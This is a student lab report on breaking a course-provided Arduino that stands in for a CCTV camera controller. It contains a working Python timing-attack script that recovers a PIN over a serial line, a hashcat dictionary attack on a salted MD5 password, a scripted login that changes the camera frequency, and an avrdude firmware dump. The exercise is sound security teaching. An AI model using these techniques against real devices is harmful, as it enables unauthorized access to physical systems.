\section{Problem set 5}
\subsection{Preface}

The goal of this assignment was to break an embedded system.

\subsection{Assignment}

\subsubsection{Prerequisites}

The lecturer provided us an \texttt{Arduino} platform with some code embedded in it. Moreover, we were given a context in which we operated:

\begin{itemize}
  \item Received system was a controller of a CCTV camera.
  \item The driver ,,CameraKey'' was known - it was shown on device startup.
  \item {
    We had access to the manual of the driver - assumption was that it was      available on the internet, we just searched the internet for it based
    on the name of the driver.
  }
  \item System controled the frequency under which the CCTV camera operates.
\end{itemize}

% Manual reference: http://cs.pwr.edu.pl/blaskiewicz/dydaktyka/embedded-security/CameraKey.html

\subsubsection{Goal}

The goal of the assignment was to change the frequency of the CCTV camera controlled by the device we've received.

\subsubsection{Challenges}
\label{seq:challenges}

Based on informations from the manual of ,,CameraKey'', we've established that to change the frequency, we had to:

\begin{itemize}
  \item Boot the device in administrator mode
  \item Provide administrator password
\end{itemize}

\subsubsection{Booting the device}

As the manual stated (subsection \ref{seq:challenges}), first of all, we had to boot the device in the administrator mode. To do that, ,,the control PIN'' had to be held LOW during boot. As we know, \texttt{Arduino} has 14 main PINs - our assumption was that one of them might be possible ,,control'' PIN.  To get ,,the control PIN'', we had to try to boot device at most 14 times. We've connected a cable to \texttt{GND} PIN from one side and started looking for ,,control'' PIN from PIN \#13 in decreasing order. On our luck, the control PIN was the next the starting PIN - it was PIN \#12.

Device was protected by a PIN code when running in administrator mode. As first, to break the PIN code, we've chosen naive brute force approach. We've assumed that PIN must by of length 4 and consist only of numbers. The device was not protected against brute force attack and thanks to that, in around 10 minutes, we've got the PIN - 5789. Later on, we've improved our attack by introduction of timing attack. The previous one required up to 10000 checks, whereas the new attack required only up to 40. In this case we've measured time required for the device to response for PINs starting with same suffix but different first number. For 9 numbers the time was almost the same, for one of them, it was a little bit longer. Based on that we've predicted first number. We've repeated same queries for the second, third and fourth digit. In this case, the PIN was known after less than 3 seconds. The advantage of the second approach was that it was more scalable. For input of length 10, it required up to $10^2$ requests, whereas the bruteforce approach up to $10 ^ {10}$. The code for performing timing attack is attached on listing \ref{fig:timing-attack}. Program execution with found PIN is attached on listing \ref{fig:master-timing-result}.

% TODO: Add code for timing attack (and maybe also for bruteforce?)

\begin{minipage}{\linewidth}
  \begin{lstlisting}[
    style=python,
    caption={Timig attack on PIN},
    captionpos=b,
    label={fig:timing-attack}
  ]
  with serial.Serial('/dev/cu.usbserial-142210', 9600, timeout=1) as ser:

    # At the beginning send some random data to make sure connection works.
    for _ in range(2):
      ser.write(b'aaa')
      ser.read(28)

    prefix = b''

    attack_start = time.time()

    # For each iteration add suffixes, start with 000, then 00, and 0
    # {0..9}000, X{0..9}00, XY{0..9}0
    # where X, Y are found numbers.
    suffixes = (b'0' * size for size in range(3, -1, -1))
    for suffix in suffixes:
      times = {}

      for idx in map(str, range(10)):
        value = prefix + idx.encode('utf-8') + suffix
        print(value, end='\r', flush=True)
        ser.write(value)
        start = time.time()
        ser.read(28)
        # Log response time for each number.
        times[idx] = time.time() - start

      # Choose number for which the response time was highest.
      number = max(times.keys(), key=lambda e: times[e])

      # Add found number to previously found numbers.
      prefix += number.encode('utf-8')


  print(f'{prefix.decode()} found in {time.time() - attack_start:.4}s.')

  \end{lstlisting}
\end{minipage}


\begin{minipage}{\linewidth}
  \begin{lstlisting}[
    style=cpp,
    caption={Output of timing attack program.},
    captionpos=b,
    label={fig:master-timing-result}
  ]
>>>  python3 timing_pin.py
5789 found in 2.833s.
  \end{lstlisting}
  \end{minipage}

\subsubsection{Retreiving administrator password}

Having PIN number and ,,control PIN'', next task was to hack the administrator password. Using system interface, we've used help command - \texttt{?} - to get controls.

\begin{minipage}{\linewidth}
  \begin{lstlisting}[
    style=cpp,
    caption={Output of \texttt{?} command.},
    captionpos=b,
    label={fig:master-arduino-init}
  ]
18:45:06.325 -> [c]hange frequency <number>
18:45:06.325 -> [d]ump current frequency
18:45:06.362 -> [l]ist files
18:45:06.362 -> [s]how file <number>
18:45:06.362 -> [?] - help
  \end{lstlisting}
  \end{minipage}

Based on help instruction, using \texttt{l} command we've listed all the files on the device.

\begin{minipage}{\linewidth}
  \begin{lstlisting}[
    style=cpp,
    caption={Output of \texttt{l} command.},
    captionpos=b,
    label={fig:master-arduino-init}
  ]
18:45:43.539 -> 1: version.txt
18:45:43.539 -> 2: passwd
  \end{lstlisting}
  \end{minipage}

Device contained of two files, ,,passwd'' and ,,version.txt''. After executing command \texttt{s 2} and \texttt{s 3} , we've got a password hash and possible firmware version.


\begin{minipage}{\linewidth}
  \begin{lstlisting}[
    style=cpp,
    caption={Output of \texttt{s 2} \& \texttt{s 3} commands.},
    captionpos=b,
    label={fig:master-arduino-init}
  ]
18:46:10.152 -> fee44f690b2d81480f0c628f6105b05a
18:47:12.123 -> 0.891.1
  \end{lstlisting}
  \end{minipage}

Having password hash, we had to break it. Our general idea was to use a dictionary attack. For the dictionary attack, we've setup a tool that is very popular for the purpose of hash breaking based on dictionary attack - \texttt{hashcat}. At first we've used ,,google-10000-english'' words database, unfortunately that did not work. The next idea was to use the list of most common polish words from database available at ,,Wikitionary'' - our assumption was that the driver providing company is - based on the data of the manual authors - from Poland. After the second attempt failed, we've decided create a wordlist from all the words available in the manual. This attempt also failed.

After that, we've decided to merge all three dictionaries and make use of the ,,version'' parameter, which, as stated in the manual, is required to obtain forgotten password. Based on that, we've tried to retry the dictionary attack and set the version parameter as salt for the hash... and it worked! Listing \ref{lst:hashcat} contains output from hashcat.

\begin{minipage}{\linewidth}
  \begin{lstlisting}[
    style=cpp,
    caption={Successful usage of \texttt{hashcat}.},
    captionpos=b,
    label={lst:hashcat}
  ]
>>> hashcat --force -m20 -O -w4 -a0 \
    fee44f690b2d81480f0c628f6105b05a:0.891.1 ~/words_list
hashcat (v5.1.0-954-gb6cc3c7d) starting...

OpenCL Platform #1: Apple
=========================
* Device #1: Intel(R) Core(TM) i7-4770HQ CPU @ 2.20GHz, skipped.
* Device #2: Iris Pro, 384/1536 MB allocatable, 40MCU

INFO: All hashes found in potfile! Use --show to display them.

Started: Mon May 13 19:49:03 2019
Stopped: Mon May 13 19:49:04 2019
>>> hashcat --force -m20 -O -w4 -a0 \
    fee44f690b2d81480f0c628f6105b05a:0.891.1 ~/words_list --show
fee44f690b2d81480f0c628f6105b05a:0.891.1:Wojtek
  \end{lstlisting}
  \end{minipage}

% TODO(szyma): Describe the password cracking phase.
% English words: https://github.com/first20hours/google-10000-english
% Wikitionary: https://en.wiktionary.org/wiki/Wiktionary:Frequency_lists/Polish_wordlist

% >>> import hashlib
% >>> m = hashlib.md5()
% >>> m.update(b'0.891.1')
% >>> m.update(b'Wojtek')
% >>> m.hexdigest()
% 'fee44f690b2d81480f0c628f6105b05a'

Having administrator password, I've created a program (attached on Listing \ref{fig:freq-change-prog}) that logs into admin mode and changes the frequency. It sends PIN to log in, sets new frequency using \texttt{c} command and dumps frequency \texttt{d}.

\begin{minipage}{\linewidth}
  \begin{lstlisting}[
    style=python,
    caption={Changing frequency using found password.},
    captionpos=b,
    label={fig:freq-change-prog}
  ]
  import time

  import serial

  def send(connection, data):
    print(f'Sending {data}.')
    connection.write(data)
    time.sleep(0.5)
    response = connection.readlines()
    print(f'Got response: {response}')
    time.sleep(0.5)


  def main():
    with serial.Serial('/dev/cu.usbserial-142210', 9600, timeout=1) as connection:

      for _ in range(2):
        connection.write(b'aaa')
        connection.read(28)

      send(connection, b'5789')  # Enter the pin.
      send(connection, b'c 1234')  # Set new frequency.
      send(connection, b'0.891.1Wojtek\n')  # Send password.
      send(connection, b'd')  # Check new frequency.

  if __name__ == "__main__":
    main()
  \end{lstlisting}
\end{minipage}

Listing \ref{fig:out-freq-change-prog} shows the output of running the program from listing \ref{fig:freq-change-prog}. The frequency was changed to \texttt{1234} and later dumped using \texttt{d}. As it is showed in the output, frequency successfully changed to \texttt{1234}.

\begin{minipage}{\linewidth}
  \begin{lstlisting}[
    style=cpp,
    caption={Output of frequency changing program.},
    captionpos=b,
    label={fig:out-freq-change-prog}
  ]
>>> python3 freq_change.py
Sending b'5789'.
Got response: [b'CameraKey Driver - 2019\r\n', b'*** ADMIN MODE ***\r\n']
Sending b'c 1234'.
Got response: [b"Enter administrator's password: \r\n"]
Sending b'0.891.1Wojtek\n'.
Got response: []
Sending b'd'.
Got response: [b'1234\r\n']
  \end{lstlisting}
  \end{minipage}


\subsubsection{Arduino code dump}

To further investigate Arduino, I've decided to dump the code. To extract data from device, \texttt{avrdump} program was used.

\begin{minipage}{\linewidth}
  \begin{lstlisting}[
    style=cpp,
    caption={AVRdude usage to dump code from Arduino.},
    captionpos=b,
    label={fig:master-arduino-init}
  ]
>>> avrdude -c arduino \
            -P /dev/cu.usbserial-142210 \
            -p atmega328p \
            -Uflash:r:d:\hexfiles\code.hex:i
  \end{lstlisting}
\end{minipage}
Dumped data in \texttt{code.hex} file required further processing to be human-readable. I've used \texttt{hexdump} program to read the data.

\begin{minipage}{\linewidth}
  \begin{lstlisting}[
    style=cpp,
    caption={AVR-objdump used to extract data from dump.},
    captionpos=b,
    label={fig:master-arduino-init}
  ]
>>> avr-objdump -s -j .sec1 code.hex > code.dump
  \end{lstlisting}
\end{minipage}

\begin{minipage}{\linewidth}
  \begin{lstlisting}[
    style=cpp,
    caption={Part of dumped code.},
    captionpos=b,
    label={fig:dumpeddata}
  ]
  0050 0c94fb00 0c94fb00 0c94fb00 0c94fb00  ................
  0060 0c94fb00 0c94fb00 70617373 77640076  ........passwd.v
  0070 65727369 6f6e2e74 78740030 2e383931  ersion.txt.0.891
  0080 2e310045 6e746572 2061646d 696e6973  .1.Enter adminis
  0090 74726174 696f6e20 50494e3a 2000f9fb  tration PIN: ...
  00a0 f4f52a2a 2a204144 4d494e20 4d4f4445  ..*** ADMIN MODE
  00b0 202a2a2a 0043616d 6572614b 65792044   ***.CameraKey D
  00c0 72697665 72202d20 32303139 005b3f5d  river - 2019.[?]
  00d0 202d2068 656c7000 5b6c5d69 73742066   - help.[l]ist f
  00e0 696c6573 0a5b735d 686f7720 66696c65  iles.[s]how file
  00f0 203c6e75 6d626572 3e005b63 5d68616e   <number>.[c]han
  0100 67652066 72657175 656e6379 203c6e75  ge frequency <nu
  0110 6d626572 3e0a5b64 5d756d70 20637572  mber>.[d]ump cur
  0120 72656e74 20667265 7175656e 6379004e  rent frequency.N
  0130 6963652c 20747279 21204572 72436f64  ice, try! ErrCod
  0140 653a2000 66656534 34663639 30623264  e: .fee44f690b2d
  0150 38313438 30663063 36323866 36313035  81480f0c628f6105
  0160 62303561 00456e74 65722061 646d696e  b05a.Enter admin
  \end{lstlisting}
\end{minipage}

What is interesting, the hash of password was not obfuscated at all and could be read from dump (Listing \ref{fig:dumpeddata}) without even knowing PIN.

\subsection{Additional task - Bluetooth playground}

After solving ,,the camera frequency problem'' we were equipped with Bluetooth module called \texttt{HC-05}. Our goal this time was to setup wireless communication between two PCs. One of the PCs was connected using Bluetooth module attached to Arduino, and the other connected with the Bluetooth module built-in it. To communicate Arduino with PC, we've created a simple echo program that retransmitted every byte from USB port into Bluetooth and from Bluetooth into USB port - that made any signal received from Bluetooth to be sent to PC and all the signals from PC sent further to Bluetooth. When the software logic was done, we've setup wire connection between Arduino and Bluetooth module.



% \subsubsection{Running in AT mode}
% % TODO:
% - describe BAUT rate change
% - describe how to get into the mode
% - describe some of the commands
